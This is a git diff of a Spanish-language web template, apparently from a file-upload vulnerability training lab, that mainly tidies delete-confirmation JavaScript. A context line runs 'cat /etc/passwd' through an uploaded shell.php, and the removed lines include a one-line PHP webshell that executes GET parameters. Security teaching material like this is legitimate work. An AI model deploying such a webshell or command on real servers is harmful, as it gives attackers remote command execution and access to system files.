@@ -126,8 +126,6 @@ curl "http://localhost:5000/uploads/shell.php?cmd=cat+/etc/passwd"</pre>
     <div><span class="tools-badge">curl</span> <span class="tools-badge">weevely</span> <span class="tools-badge">msfvenom</span> <span class="tools-badge">Burp Suite</span></div>
   </div>
 </div>
-{% endblock %}
-
 
 <script>
 function updateLabel(input) {
@@ -140,7 +138,7 @@ function updateLabel(input) {
 }
 window.deleteFile = function(event, filename) {
   if (event) event.preventDefault();
-  if (!confirm('¿Seguro que deseas eliminar el archivo ' + filename + '?')) return false;
+  if (!confirm('Eliminar ' + filename + '?')) return false;
   fetch('/uploads/delete/' + encodeURIComponent(filename), {
     method: 'POST',
     headers: { 'X-Requested-With': 'XMLHttpRequest' }
@@ -154,21 +152,9 @@ window.deleteFile = function(event, filename) {
     }
   })
   .catch(() => {
-    alert('Error de red o servidor al eliminar el archivo.');
+    alert('Error de red al eliminar el archivo.');
   });
   return false;
-}
-if (!window.deleteFile) {
-  window.deleteFile = function(event, filename) {
-    alert('No se pudo inicializar la función de borrado. Recarga la página.');
-    return false;
-  }
-}
+};
 </script>
-<div class="alert-danger mb-4 text-xs font-mono">
-  <b>¿Ves el error "Undefined constant 'cmd'" al subir una webshell PHP?</b><br>
-  Asegúrate de que el archivo <b>NO</b> tenga espacios, saltos de línea ni BOM antes de <b>&lt;?php</b>.<br>
-  Sube el archivo desde Linux/macOS con:<br>
-  <code>echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php</code><br>
-  Verifica que el primer byte del archivo sea <b>&lt;</b> y que la codificación sea UTF-8 sin BOM.
-</div>
+{% endblock %}
